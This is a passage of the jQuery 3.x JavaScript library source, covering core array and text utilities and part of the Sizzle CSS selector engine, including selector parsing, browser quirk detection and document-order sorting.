						ret += jQuery.text( node );
					}
				}
				if ( nodeType === 1 || nodeType === 11 ) {
					return elem.textContent;
				}
				if ( nodeType === 9 ) {
					return elem.documentElement.textContent;
				}
				if ( nodeType === 3 || nodeType === 4 ) {
					return elem.nodeValue;
				}

				// Do not include comment or processing instruction nodes

				return ret;
			},

			// results is for internal usage only
			makeArray: function( arr, results ) {
				var ret = results || [];

				if ( arr != null ) {
					if ( isArrayLike( Object( arr ) ) ) {
						jQuery.merge( ret,
							typeof arr === "string" ?
								[ arr ] : arr
						);
					} else {
						push.call( ret, arr );
					}
				}

				return ret;
			},

			inArray: function( elem, arr, i ) {
				return arr == null ? -1 : indexOf.call( arr, elem, i );
			},

			isXMLDoc: function( elem ) {
				var namespace = elem && elem.namespaceURI,
					docElem = elem && ( elem.ownerDocument || elem ).documentElement;

				// Assume HTML when documentElement doesn't yet exist, such as inside
				// document fragments.
				return !rhtmlSuffix.test( namespace || docElem && docElem.nodeName || "HTML" );
			},

			// Support: Android <=4.0 only, PhantomJS 1 only
			// push.apply(_, arraylike) throws on ancient WebKit
			merge: function( first, second ) {
				var len = +second.length,
					j = 0,
					i = first.length;

				for ( ; j < len; j++ ) {
					first[ i++ ] = second[ j ];
				}

				first.length = i;

				return first;
			},

			grep: function( elems, callback, invert ) {
				var callbackInverse,
					matches = [],
					i = 0,
					length = elems.length,
					callbackExpect = !invert;

				// Go through the array, only saving the items
				// that pass the validator function
				for ( ; i < length; i++ ) {
					callbackInverse = !callback( elems[ i ], i );
					if ( callbackInverse !== callbackExpect ) {
						matches.push( elems[ i ] );
					}
				}

				return matches;
			},

			// arg is for internal usage only
			map: function( elems, callback, arg ) {
				var length, value,
					i = 0,
					ret = [];

				// Go through the array, translating each of the items to their new values
				if ( isArrayLike( elems ) ) {
					length = elems.length;
					for ( ; i < length; i++ ) {
						value = callback( elems[ i ], i, arg );

						if ( value != null ) {
							ret.push( value );
						}
					}

				// Go through every key on the object,
				} else {
					for ( i in elems ) {
						value = callback( elems[ i ], i, arg );

						if ( value != null ) {
							ret.push( value );
						}
					}
				}

				// Flatten any nested arrays
				return flat( ret );
			},

			// A global GUID counter for objects
			guid: 1,

			// jQuery.support is not used in Core but other projects attach their
			// properties to it so it needs to exist.
			support: support
		} );

		if ( typeof Symbol === "function" ) {
			jQuery.fn[ Symbol.iterator ] = arr[ Symbol.iterator ];
		}

		// Populate the class2type map
		jQuery.each( "Boolean Number String Function Array Date RegExp Object Error Symbol".split( " " ),
			function( _i, name ) {
				class2type[ "[object " + name + "]" ] = name.toLowerCase();
			} );

		function isArrayLike( obj ) {

			// Support: real iOS 8.2 only (not reproducible in simulator)
			// `in` check used to prevent JIT error (gh-2145)
			// hasOwn isn't used here due to false negatives
			// regarding Nodelist length in IE
			var length = !!obj && "length" in obj && obj.length,
				type = toType( obj );

			if ( isFunction( obj ) || isWindow( obj ) ) {
				return false;
			}

			return type === "array" || length === 0 ||
				typeof length === "number" && length > 0 && ( length - 1 ) in obj;
		}


		function nodeName( elem, name ) {

			return elem.nodeName && elem.nodeName.toLowerCase() === name.toLowerCase();

		}
		var pop = arr.pop;


		var sort = arr.sort;


		var splice = arr.splice;


		var whitespace = "[\\x20\\t\\r\\n\\f]";


		var rtrimCSS = new RegExp(
			"^" + whitespace + "+|((?:^|[^\\\\])(?:\\\\.)*)" + whitespace + "+$",
			"g"
		);




		// Note: an element does not contain itself
		jQuery.contains = function( a, b ) {
			var bup = b && b.parentNode;

			return a === bup || !!( bup && bup.nodeType === 1 && (

				// Support: IE 9 - 11+
				// IE doesn't have `contains` on SVG.
				a.contains ?
					a.contains( bup ) :
					a.compareDocumentPosition && a.compareDocumentPosition( bup ) & 16
			) );
		};




		// CSS string/identifier serialization
		// https://drafts.csswg.org/cssom/#common-serializing-idioms
		var rcssescape = /([\0-\x1f\x7f]|^-?\d)|^-$|[^\x80-\uFFFF\w-]/g;

		function fcssescape( ch, asCodePoint ) {
			if ( asCodePoint ) {

				// U+0000 NULL becomes U+FFFD REPLACEMENT CHARACTER
				if ( ch === "\0" ) {
					return "\uFFFD";
				}

				// Control characters and (dependent upon position) numbers get escaped as code points
				return ch.slice( 0, -1 ) + "\\" + ch.charCodeAt( ch.length - 1 ).toString( 16 ) + " ";
			}

			// Other potentially-special ASCII characters get backslash-escaped
			return "\\" + ch;
		}

		jQuery.escapeSelector = function( sel ) {
			return ( sel + "" ).replace( rcssescape, fcssescape );
		};




		var preferredDoc = document,
			pushNative = push;

		( function() {

		var i,
			Expr,
			outermostContext,
			sortInput,
			hasDuplicate,
			push = pushNative,

			// Local document vars
			document,
			documentElement,
			documentIsHTML,
			rbuggyQSA,
			matches,

			// Instance-specific data
			expando = jQuery.expando,
			dirruns = 0,
			done = 0,
			classCache = createCache(),
			tokenCache = createCache(),
			compilerCache = createCache(),
			nonnativeSelectorCache = createCache(),
			sortOrder = function( a, b ) {
				if ( a === b ) {
					hasDuplicate = true;
				}
				return 0;
			},

			booleans = "checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|" +
				"loop|multiple|open|readonly|required|scoped",

			// Regular expressions

			// https://www.w3.org/TR/css-syntax-3/#ident-token-diagram
			identifier = "(?:\\\\[\\da-fA-F]{1,6}" + whitespace +
				"?|\\\\[^\\r\\n\\f]|[\\w-]|[^\0-\\x7f])+",

			// Attribute selectors: https://www.w3.org/TR/selectors/#attribute-selectors
			attributes = "\\[" + whitespace + "*(" + identifier + ")(?:" + whitespace +

				// Operator (capture 2)
				"*([*^$|!~]?=)" + whitespace +

				// "Attribute values must be CSS identifiers [capture 5] or strings [capture 3 or capture 4]"
				"*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|(" + identifier + "))|)" +
				whitespace + "*\\]",

			pseudos = ":(" + identifier + ")(?:\\((" +

				// To reduce the number of selectors needing tokenize in the preFilter, prefer arguments:
				// 1. quoted (capture 3; capture 4 or capture 5)
				"('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|" +

				// 2. simple (capture 6)
				"((?:\\\\.|[^\\\\()[\\]]|" + attributes + ")*)|" +

				// 3. anything else (capture 2)
				".*" +
				")\\)|)",

			// Leading and non-escaped trailing whitespace, capturing some non-whitespace characters preceding the latter
			rwhitespace = new RegExp( whitespace + "+", "g" ),

			rcomma = new RegExp( "^" + whitespace + "*," + whitespace + "*" ),
			rleadingCombinator = new RegExp( "^" + whitespace + "*([>+~]|" + whitespace + ")" +
				whitespace + "*" ),
			rdescend = new RegExp( whitespace + "|>" ),

			rpseudo = new RegExp( pseudos ),
			ridentifier = new RegExp( "^" + identifier + "$" ),

			matchExpr = {
				ID: new RegExp( "^#(" + identifier + ")" ),
				CLASS: new RegExp( "^\\.(" + identifier + ")" ),
				TAG: new RegExp( "^(" + identifier + "|[*])" ),
				ATTR: new RegExp( "^" + attributes ),
				PSEUDO: new RegExp( "^" + pseudos ),
				CHILD: new RegExp(
					"^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\(" +
						whitespace + "*(even|odd|(([+-]|)(\\d*)n|)" + whitespace + "*(?:([+-]|)" +
						whitespace + "*(\\d+)|))" + whitespace + "*\\)|)", "i" ),
				bool: new RegExp( "^(?:" + booleans + ")$", "i" ),

				// For use in libraries implementing .is()
				// We use this for POS matching in `select`
				needsContext: new RegExp( "^" + whitespace +
					"*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\(" + whitespace +
					"*((?:-\\d)?\\d*)" + whitespace + "*\\)|)(?=[^-]|$)", "i" )
			},

			rinputs = /^(?:input|select|textarea|button)$/i,
			rheader = /^h\d$/i,

			// Easily-parseable/retrievable ID or TAG or CLASS selectors
			rquickExpr = /^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,

			rsibling = /[+~]/,

			// CSS escapes
			// https://www.w3.org/TR/CSS21/syndata.html#escaped-characters
			runescape = new RegExp( "\\\\[\\da-fA-F]{1,6}" + whitespace +
				"?|\\\\([^\\r\\n\\f])", "g" ),
			funescape = function( escape, nonHex ) {
				var high = "0x" + escape.slice( 1 ) - 0x10000;

				if ( nonHex ) {

					// Strip the backslash prefix from a non-hex escape sequence
					return nonHex;
				}

				// Replace a hexadecimal escape sequence with the encoded Unicode code point
				// Support: IE <=11+
				// For values outside the Basic Multilingual Plane (BMP), manually construct a
				// surrogate pair
				return high < 0 ?
					String.fromCharCode( high + 0x10000 ) :
					String.fromCharCode( high >> 10 | 0xD800, high & 0x3FF | 0xDC00 );
			},

			// Used for iframes; see `setDocument`.
			// Support: IE 9 - 11+, Edge 12 - 18+
			// Removing the function wrapper causes a "Permission Denied"
			// error in IE/Edge.
			unloadHandler = function() {
				setDocument();
			},

			inDisabledFieldset = addCombinator(
				function( elem ) {
					return elem.disabled === true && nodeName( elem, "fieldset" );
				},
				{ dir: "parentNode", next: "legend" }
			);

		// Support: IE <=9 only
		// Accessing document.activeElement can throw unexpectedly
		// https://bugs.jquery.com/ticket/13393
		function safeActiveElement() {
			try {
				return document.activeElement;
			} catch ( err ) { }
		}

		// Optimize for push.apply( _, NodeList )
		try {
			push.apply(
				( arr = slice.call( preferredDoc.childNodes ) ),
				preferredDoc.childNodes
			);

			// Support: Android <=4.0
			// Detect silently failing push.apply
			// eslint-disable-next-line no-unused-expressions
			arr[ preferredDoc.childNodes.length ].nodeType;
		} catch ( e ) {
			push = {
				apply: function( target, els ) {
					pushNative.apply( target, slice.call( els ) );
				},
				call: function( target ) {
					pushNative.apply( target, slice.call( arguments, 1 ) );
				}
			};
		}

		function find( selector, context, results, seed ) {
			var m, i, elem, nid, match, groups, newSelector,
				newContext = context && context.ownerDocument,

				// nodeType defaults to 9, since context defaults to document
				nodeType = context ? context.nodeType : 9;

			results = results || [];

			// Return early from calls with invalid selector or context
			if ( typeof selector !== "string" || !selector ||
				nodeType !== 1 && nodeType !== 9 && nodeType !== 11 ) {

				return results;
			}

			// Try to shortcut find operations (as opposed to filters) in HTML documents
			if ( !seed ) {
				setDocument( context );
				context = context || document;

				if ( documentIsHTML ) {

					// If the selector is sufficiently simple, try using a "get*By*" DOM method
					// (excepting DocumentFragment context, where the methods don't exist)
					if ( nodeType !== 11 && ( match = rquickExpr.exec( selector ) ) ) {

						// ID selector
						if ( ( m = match[ 1 ] ) ) {

							// Document context
							if ( nodeType === 9 ) {
								if ( ( elem = context.getElementById( m ) ) ) {

									// Support: IE 9 only
									// getElementById can match elements by name instead of ID
									if ( elem.id === m ) {
										push.call( results, elem );
										return results;
									}
								} else {
									return results;
								}

							// Element context
							} else {

								// Support: IE 9 only
								// getElementById can match elements by name instead of ID
								if ( newContext && ( elem = newContext.getElementById( m ) ) &&
									find.contains( context, elem ) &&
									elem.id === m ) {

									push.call( results, elem );
									return results;
								}
							}

						// Type selector
						} else if ( match[ 2 ] ) {
							push.apply( results, context.getElementsByTagName( selector ) );
							return results;

						// Class selector
						} else if ( ( m = match[ 3 ] ) && context.getElementsByClassName ) {
							push.apply( results, context.getElementsByClassName( m ) );
							return results;
						}
					}

					// Take advantage of querySelectorAll
					if ( !nonnativeSelectorCache[ selector + " " ] &&
						( !rbuggyQSA || !rbuggyQSA.test( selector ) ) ) {

						newSelector = selector;
						newContext = context;

						// qSA considers elements outside a scoping root when evaluating child or
						// descendant combinators, which is not what we want.
						// In such cases, we work around the behavior by prefixing every selector in the
						// list with an ID selector referencing the scope context.
						// The technique has to be used as well when a leading combinator is used
						// as such selectors are not recognized by querySelectorAll.
						// Thanks to Andrew Dupont for this technique.
						if ( nodeType === 1 &&
							( rdescend.test( selector ) || rleadingCombinator.test( selector ) ) ) {

							// Expand context for sibling selectors
							newContext = rsibling.test( selector ) && testContext( context.parentNode ) ||
								context;

							// We can use :scope instead of the ID hack if the browser
							// supports it & if we're not changing the context.
							// Support: IE 11+, Edge 17 - 18+
							// IE/Edge sometimes throw a "Permission denied" error when
							// strict-comparing two documents; shallow comparisons work.
							// eslint-disable-next-line eqeqeq
							if ( newContext != context || !support.scope ) {

								// Capture the context ID, setting it first if necessary
								if ( ( nid = context.getAttribute( "id" ) ) ) {
									nid = jQuery.escapeSelector( nid );
								} else {
									context.setAttribute( "id", ( nid = expando ) );
								}
							}

							// Prefix every selector in the list
							groups = tokenize( selector );
							i = groups.length;
							while ( i-- ) {
								groups[ i ] = ( nid ? "#" + nid : ":scope" ) + " " +
									toSelector( groups[ i ] );
							}
							newSelector = groups.join( "," );
						}

						try {
							push.apply( results,
								newContext.querySelectorAll( newSelector )
							);
							return results;
						} catch ( qsaError ) {
							nonnativeSelectorCache( selector, true );
						} finally {
							if ( nid === expando ) {
								context.removeAttribute( "id" );
							}
						}
					}
				}
			}

			// All others
			return select( selector.replace( rtrimCSS, "$1" ), context, results, seed );
		}

		/**
		 * Create key-value caches of limited size
		 * @returns {function(string, object)} Returns the Object data after storing it on itself with
		 *	property name the (space-suffixed) string and (if the cache is larger than Expr.cacheLength)
		 *	deleting the oldest entry
		 */
		function createCache() {
			var keys = [];

			function cache( key, value ) {

				// Use (key + " ") to avoid collision with native prototype properties
				// (see https://github.com/jquery/sizzle/issues/157)
				if ( keys.push( key + " " ) > Expr.cacheLength ) {

					// Only keep the most recent entries
					delete cache[ keys.shift() ];
				}
				return ( cache[ key + " " ] = value );
			}
			return cache;
		}

		/**
		 * Mark a function for special use by jQuery selector module
		 * @param {Function} fn The function to mark
		 */
		function markFunction( fn ) {
			fn[ expando ] = true;
			return fn;
		}

		/**
		 * Support testing using an element
		 * @param {Function} fn Passed the created element and returns a boolean result
		 */
		function assert( fn ) {
			var el = document.createElement( "fieldset" );

			try {
				return !!fn( el );
			} catch ( e ) {
				return false;
			} finally {

				// Remove from its parent by default
				if ( el.parentNode ) {
					el.parentNode.removeChild( el );
				}

				// release memory in IE
				el = null;
			}
		}

		/**
		 * Returns a function to use in pseudos for input types
		 * @param {String} type
		 */
		function createInputPseudo( type ) {
			return function( elem ) {
				return nodeName( elem, "input" ) && elem.type === type;
			};
		}

		/**
		 * Returns a function to use in pseudos for buttons
		 * @param {String} type
		 */
		function createButtonPseudo( type ) {
			return function( elem ) {
				return ( nodeName( elem, "input" ) || nodeName( elem, "button" ) ) &&
					elem.type === type;
			};
		}

		/**
		 * Returns a function to use in pseudos for :enabled/:disabled
		 * @param {Boolean} disabled true for :disabled; false for :enabled
		 */
		function createDisabledPseudo( disabled ) {

			// Known :disabled false positives: fieldset[disabled] > legend:nth-of-type(n+2) :can-disable
			return function( elem ) {

				// Only certain elements can match :enabled or :disabled
				// https://html.spec.whatwg.org/multipage/scripting.html#selector-enabled
				// https://html.spec.whatwg.org/multipage/scripting.html#selector-disabled
				if ( "form" in elem ) {

					// Check for inherited disabledness on relevant non-disabled elements:
					// * listed form-associated elements in a disabled fieldset
					//   https://html.spec.whatwg.org/multipage/forms.html#category-listed
					//   https://html.spec.whatwg.org/multipage/forms.html#concept-fe-disabled
					// * option elements in a disabled optgroup
					//   https://html.spec.whatwg.org/multipage/forms.html#concept-option-disabled
					// All such elements have a "form" property.
					if ( elem.parentNode && elem.disabled === false ) {

						// Option elements defer to a parent optgroup if present
						if ( "label" in elem ) {
							if ( "label" in elem.parentNode ) {
								return elem.parentNode.disabled === disabled;
							} else {
								return elem.disabled === disabled;
							}
						}

						// Support: IE 6 - 11+
						// Use the isDisabled shortcut property to check for disabled fieldset ancestors
						return elem.isDisabled === disabled ||

							// Where there is no isDisabled, check manually
							elem.isDisabled !== !disabled &&
								inDisabledFieldset( elem ) === disabled;
					}

					return elem.disabled === disabled;

				// Try to winnow out elements that can't be disabled before trusting the disabled property.
				// Some victims get caught in our net (label, legend, menu, track), but it shouldn't
				// even exist on them, let alone have a boolean value.
				} else if ( "label" in elem ) {
					return elem.disabled === disabled;
				}

				// Remaining elements are neither :enabled nor :disabled
				return false;
			};
		}

		/**
		 * Returns a function to use in pseudos for positionals
		 * @param {Function} fn
		 */
		function createPositionalPseudo( fn ) {
			return markFunction( function( argument ) {
				argument = +argument;
				return markFunction( function( seed, matches ) {
					var j,
						matchIndexes = fn( [], seed.length, argument ),
						i = matchIndexes.length;

					// Match elements found at the specified indexes
					while ( i-- ) {
						if ( seed[ ( j = matchIndexes[ i ] ) ] ) {
							seed[ j ] = !( matches[ j ] = seed[ j ] );
						}
					}
				} );
			} );
		}

		/**
		 * Checks a node for validity as a jQuery selector context
		 * @param {Element|Object=} context
		 * @returns {Element|Object|Boolean} The input node if acceptable, otherwise a falsy value
		 */
		function testContext( context ) {
			return context && typeof context.getElementsByTagName !== "undefined" && context;
		}

		/**
		 * Sets document-related variables once based on the current document
		 * @param {Element|Object} [node] An element or document object to use to set the document
		 * @returns {Object} Returns the current document
		 */
		function setDocument( node ) {
			var subWindow,
				doc = node ? node.ownerDocument || node : preferredDoc;

			// Return early if doc is invalid or already selected
			// Support: IE 11+, Edge 17 - 18+
			// IE/Edge sometimes throw a "Permission denied" error when strict-comparing
			// two documents; shallow comparisons work.
			// eslint-disable-next-line eqeqeq
			if ( doc == document || doc.nodeType !== 9 || !doc.documentElement ) {
				return document;
			}

			// Update global variables
			document = doc;
			documentElement = document.documentElement;
			documentIsHTML = !jQuery.isXMLDoc( document );

			// Support: iOS 7 only, IE 9 - 11+
			// Older browsers didn't support unprefixed `matches`.
			matches = documentElement.matches ||
				documentElement.webkitMatchesSelector ||
				documentElement.msMatchesSelector;

			// Support: IE 9 - 11+, Edge 12 - 18+
			// Accessing iframe documents after unload throws "permission denied" errors
			// (see trac-13936).
			// Limit the fix to IE & Edge Legacy; despite Edge 15+ implementing `matches`,
			// all IE 9+ and Edge Legacy versions implement `msMatchesSelector` as well.
			if ( documentElement.msMatchesSelector &&

				// Support: IE 11+, Edge 17 - 18+
				// IE/Edge sometimes throw a "Permission denied" error when strict-comparing
				// two documents; shallow comparisons work.
				// eslint-disable-next-line eqeqeq
				preferredDoc != document &&
				( subWindow = document.defaultView ) && subWindow.top !== subWindow ) {

				// Support: IE 9 - 11+, Edge 12 - 18+
				subWindow.addEventListener( "unload", unloadHandler );
			}

			// Support: IE <10
			// Check if getElementById returns elements by name
			// The broken getElementById methods don't pick up programmatically-set names,
			// so use a roundabout getElementsByName test
			support.getById = assert( function( el ) {
				documentElement.appendChild( el ).id = jQuery.expando;
				return !document.getElementsByName ||
					!document.getElementsByName( jQuery.expando ).length;
			} );

			// Support: IE 9 only
			// Check to see if it's possible to do matchesSelector
			// on a disconnected node.
			support.disconnectedMatch = assert( function( el ) {
				return matches.call( el, "*" );
			} );

			// Support: IE 9 - 11+, Edge 12 - 18+
			// IE/Edge don't support the :scope pseudo-class.
			support.scope = assert( function() {
				return document.querySelectorAll( ":scope" );
			} );

			// Support: Chrome 105 - 111 only, Safari 15.4 - 16.3 only
			// Make sure the `:has()` argument is parsed unforgivingly.
			// We include `*` in the test to detect buggy implementations that are
			// _selectively_ forgiving (specifically when the list includes at least
			// one valid selector).
			// Note that we treat complete lack of support for `:has()` as if it were
			// spec-compliant support, which is fine because use of `:has()` in such
			// environments will fail in the qSA path and fall back to jQuery traversal
			// anyway.
			support.cssHas = assert( function() {
				try {
					document.querySelector( ":has(*,:jqfake)" );
					return false;
				} catch ( e ) {
					return true;
				}
			} );

			// ID filter and find
			if ( support.getById ) {
				Expr.filter.ID = function( id ) {
					var attrId = id.replace( runescape, funescape );
					return function( elem ) {
						return elem.getAttribute( "id" ) === attrId;
					};
				};
				Expr.find.ID = function( id, context ) {
					if ( typeof context.getElementById !== "undefined" && documentIsHTML ) {
						var elem = context.getElementById( id );
						return elem ? [ elem ] : [];
					}
				};
			} else {
				Expr.filter.ID =  function( id ) {
					var attrId = id.replace( runescape, funescape );
					return function( elem ) {
						var node = typeof elem.getAttributeNode !== "undefined" &&
							elem.getAttributeNode( "id" );
						return node && node.value === attrId;
					};
				};

				// Support: IE 6 - 7 only
				// getElementById is not reliable as a find shortcut
				Expr.find.ID = function( id, context ) {
					if ( typeof context.getElementById !== "undefined" && documentIsHTML ) {
						var node, i, elems,
							elem = context.getElementById( id );

						if ( elem ) {

							// Verify the id attribute
							node = elem.getAttributeNode( "id" );
							if ( node && node.value === id ) {
								return [ elem ];
							}

							// Fall back on getElementsByName
							elems = context.getElementsByName( id );
							i = 0;
							while ( ( elem = elems[ i++ ] ) ) {
								node = elem.getAttributeNode( "id" );
								if ( node && node.value === id ) {
									return [ elem ];
								}
							}
						}

						return [];
					}
				};
			}

			// Tag
			Expr.find.TAG = function( tag, context ) {
				if ( typeof context.getElementsByTagName !== "undefined" ) {
					return context.getElementsByTagName( tag );

				// DocumentFragment nodes don't have gEBTN
				} else {
					return context.querySelectorAll( tag );
				}
			};

			// Class
			Expr.find.CLASS = function( className, context ) {
				if ( typeof context.getElementsByClassName !== "undefined" && documentIsHTML ) {
					return context.getElementsByClassName( className );
				}
			};

			/* QSA/matchesSelector
			---------------------------------------------------------------------- */

			// QSA and matchesSelector support

			rbuggyQSA = [];

			// Build QSA regex
			// Regex strategy adopted from Diego Perini
			assert( function( el ) {

				var input;

				documentElement.appendChild( el ).innerHTML =
					"<a id='" + expando + "' href='' disabled='disabled'></a>" +
					"<select id='" + expando + "-\r\\' disabled='disabled'>" +
					"<option selected=''></option></select>";

				// Support: iOS <=7 - 8 only
				// Boolean attributes and "value" are not treated correctly in some XML documents
				if ( !el.querySelectorAll( "[selected]" ).length ) {
					rbuggyQSA.push( "\\[" + whitespace + "*(?:value|" + booleans + ")" );
				}

				// Support: iOS <=7 - 8 only
				if ( !el.querySelectorAll( "[id~=" + expando + "-]" ).length ) {
					rbuggyQSA.push( "~=" );
				}

				// Support: iOS 8 only
				// https://bugs.webkit.org/show_bug.cgi?id=136851
				// In-page `selector#id sibling-combinator selector` fails
				if ( !el.querySelectorAll( "a#" + expando + "+*" ).length ) {
					rbuggyQSA.push( ".#.+[+~]" );
				}

				// Support: Chrome <=105+, Firefox <=104+, Safari <=15.4+
				// In some of the document kinds, these selectors wouldn't work natively.
				// This is probably OK but for backwards compatibility we want to maintain
				// handling them through jQuery traversal in jQuery 3.x.
				if ( !el.querySelectorAll( ":checked" ).length ) {
					rbuggyQSA.push( ":checked" );
				}

				// Support: Windows 8 Native Apps
				// The type and name attributes are restricted during .innerHTML assignment
				input = document.createElement( "input" );
				input.setAttribute( "type", "hidden" );
				el.appendChild( input ).setAttribute( "name", "D" );

				// Support: IE 9 - 11+
				// IE's :disabled selector does not pick up the children of disabled fieldsets
				// Support: Chrome <=105+, Firefox <=104+, Safari <=15.4+
				// In some of the document kinds, these selectors wouldn't work natively.
				// This is probably OK but for backwards compatibility we want to maintain
				// handling them through jQuery traversal in jQuery 3.x.
				documentElement.appendChild( el ).disabled = true;
				if ( el.querySelectorAll( ":disabled" ).length !== 2 ) {
					rbuggyQSA.push( ":enabled", ":disabled" );
				}

				// Support: IE 11+, Edge 15 - 18+
				// IE 11/Edge don't find elements on a `[name='']` query in some cases.
				// Adding a temporary attribute to the document before the selection works
				// around the issue.
				// Interestingly, IE 10 & older don't seem to have the issue.
				input = document.createElement( "input" );
				input.setAttribute( "name", "" );
				el.appendChild( input );
				if ( !el.querySelectorAll( "[name='']" ).length ) {
					rbuggyQSA.push( "\\[" + whitespace + "*name" + whitespace + "*=" +
						whitespace + "*(?:''|\"\")" );
				}
			} );

			if ( !support.cssHas ) {

				// Support: Chrome 105 - 110+, Safari 15.4 - 16.3+
				// Our regular `try-catch` mechanism fails to detect natively-unsupported
				// pseudo-classes inside `:has()` (such as `:has(:contains("Foo"))`)
				// in browsers that parse the `:has()` argument as a forgiving selector list.
				// https://drafts.csswg.org/selectors/#relational now requires the argument
				// to be parsed unforgivingly, but browsers have not yet fully adjusted.
				rbuggyQSA.push( ":has" );
			}

			rbuggyQSA = rbuggyQSA.length && new RegExp( rbuggyQSA.join( "|" ) );

			/* Sorting
			---------------------------------------------------------------------- */

			// Document order sorting
			sortOrder = function( a, b ) {

				// Flag for duplicate removal
				if ( a === b ) {
					hasDuplicate = true;
					return 0;
				}

				// Sort on method existence if only one input has compareDocumentPosition
				var compare = !a.compareDocumentPosition - !b.compareDocumentPosition;
				if ( compare ) {
					return compare;
				}

				// Calculate position if both inputs belong to the same document
				// Support: IE 11+, Edge 17 - 18+
				// IE/Edge sometimes throw a "Permission denied" error when strict-comparing
				// two documents; shallow comparisons work.
				// eslint-disable-next-line eqeqeq
				compare = ( a.ownerDocument || a ) == ( b.ownerDocument || b ) ?
					a.compareDocumentPosition( b ) :

					// Otherwise we know they are disconnected
					1;

				// Disconnected nodes
				if ( compare & 1 ||
					( !support.sortDetached && b.compareDocumentPosition( a ) === compare ) ) {

					// Choose the first element that is related to our preferred document
					// Support: IE 11+, Edge 17 - 18+
					// IE/Edge sometimes throw a "Permission denied" error when strict-comparing
					// two documents; shallow comparisons work.
					// eslint-disable-next-line eqeqeq
					if ( a === document || a.ownerDocument == preferredDoc &&
						find.contains( preferredDoc, a ) ) {
						return -1;
					}

					// Support: IE 11+, Edge 17 - 18+
					// IE/Edge sometimes throw a "Permission denied" error when strict-comparing
					// two documents; shallow comparisons work.
					// eslint-disable-next-line eqeqeq
					if ( b === document || b.ownerDocument == preferredDoc &&
						find.contains( preferredDoc, b ) ) {
						return 1;
					}

					// Maintain original order
					return sortInput ?
						( indexOf.call( sortInput, a ) - indexOf.call( sortInput, b ) ) :
						0;
				}

				return compare & 4 ? -1 : 1;
			};

			return document;
		}

		find.matches = function( expr, elements ) {
			return find( expr, null, null, elements );
		};

		find.matchesSelector = function( elem, expr ) {
			setDocument( elem );

			if ( documentIsHTML &&
				!nonnativeSelectorCache[ expr + " " ] &&
				( !rbuggyQSA || !rbuggyQSA.test( expr ) ) ) {

				try {
					var ret = matches.call( elem, expr );

					// IE 9's matchesSelector returns false on disconnected nodes
					if ( ret || support.disconnectedMatch ||

							// As well, disconnected nodes are said to be in a document
							// fragment in IE 9
							elem.document && elem.document.nodeType !== 11 ) {
						return ret;
					}
				} catch ( e ) {
					nonnativeSelectorCache( expr, true );
				}
			}

			return find( expr, document, null, [ elem ] ).length > 0;
		};

		find.contains = function( context, elem ) {

			// Set document vars if needed
			// Support: IE 11+, Edge 17 - 18+
			// IE/Edge sometimes throw a "Permission denied" error when strict-comparing
			// two documents; shallow comparisons work.
			// eslint-disable-next-line eqeqeq
			if ( ( context.ownerDocument || context ) != document ) {
				setDocument( context );
			}
			return jQuery.contains( context, elem );
		};


		find.attr = function( elem, name ) {

			// Set document vars if needed
			// Support: IE 11+, Edge 17 - 18+
			// IE/Edge sometimes throw a "Permission denied" error when strict-comparing
			// two documents; shallow comparisons work.
			// eslint-disable-next-line eqeqeq
			if ( ( elem.ownerDocument || elem ) != document ) {
				setDocument( elem );
			}

			var fn = Expr.attrHandle[ name.toLowerCase() ],

				// Don't get fooled by Object.prototype properties (see trac-13807)
				val = fn && hasOwn.call( Expr.attrHandle, name.toLowerCase() ) ?
					fn( elem, name, !documentIsHTML ) :
					undefined;

			if ( val !== undefined ) {
				return val;
			}

			return elem.getAttribute( name );
		};

		find.error = function( msg ) {
			throw new Error( "Syntax error, unrecognized expression: " + msg );
		};

		/**
		 * Document sorting and removing duplicates
		 * @param {ArrayLike} results
		 */
		jQuery.uniqueSort = function( results ) {
			var elem,
				duplicates = [],
				j = 0,
				i = 0;

			// Unless we *know* we can detect duplicates, assume their presence
			//
			// Support: Android <=4.0+
			// Testing for detecting duplicates is unpredictable so instead assume we can't
			// depend on duplicate detection in all browsers without a stable sort.
			hasDuplicate = !support.sortStable;
			sortInput = !support.sortStable && slice.call( results, 0 );
			sort.call( results, sortOrder );

			if ( hasDuplicate ) {
				while ( ( elem = results[ i++ ] ) ) {
					if ( elem === results[ i ] ) {
						j = duplicates.push( i );
					}
				}
				while ( j-- ) {
					splice.call( results, duplicates[ j ], 1 );
				}
			}

			// Clear input after sorting to release objects
			// See https://github.com/jquery/sizzle/pull/225
			sortInput = null;

			return results;
		};

		jQuery.fn.uniqueSort = function() {
			return this.pushStack( jQuery.uniqueSort( slice.apply( this ) ) );
		};

		Expr = jQuery.expr = {

			// Can be adjusted by the user
			cacheLength: 50,

			createPseudo: markFunction,

			match: matchExpr,

			attrHandle: {},

			find: {},

			relative: {
				">": { dir: "parentNode", first: true },
				" ": { dir: "parentNode" },
				"+": { dir: "previousSibling", first: true },
				"~": { dir: "previousSibling" }
			},

			preFilter: {
				ATTR: function( match ) {
					match[ 1 ] = match[ 1 ].replace( runescape, funescape );

					// Move the given value to match[3] whether quoted or unquoted
					match[ 3 ] = ( match[ 3 ] || match[ 4 ] || match[ 5 ] || "" )
						.replace( runescape, funescape );

					if ( match[ 2 ] === "~=" ) {
						match[ 3 ] = " " + match[ 3 ] + " ";
					}

					return match.slice( 0, 4 );
				},

				CHILD: function( match ) {

					/* matches from matchExpr["CHILD"]
						1 type (only|nth|...)
						2 what (child|of-type)
						3 argument (even|odd|\d*|\d*n([+-]\d+)?|...)
						4 xn-component of xn+y argument ([+-]?\d*n|)
						5 sign of xn-component
						6 x of xn-component
						7 sign of y-component
						8 y of y-component
					*/
					match[ 1 ] = match[ 1 ].toLowerCase();

					if ( match[ 1 ].slice( 0, 3 ) === "nth" ) {

						// nth-* requires argument
						if ( !match[ 3 ] ) {
							find.error( match[ 0 ] );
						}

						// numeric x and y parameters for Expr.filter.CHILD
						// remember that false/true cast respectively to 0/1
						match[ 4 ] = +( match[ 4 ] ?
							match[ 5 ] + ( match[ 6 ] || 1 ) :
							2 * ( match[ 3 ] === "even" || match[ 3 ] === "odd" )
						);
						match[ 5 ] = +( ( match[ 7 ] + match[ 8 ] ) || match[ 3 ] === "odd" );

					// other types prohibit arguments
					} else if ( match[ 3 ] ) {
						find.error( match[ 0 ] );
					}

					return match;
				},
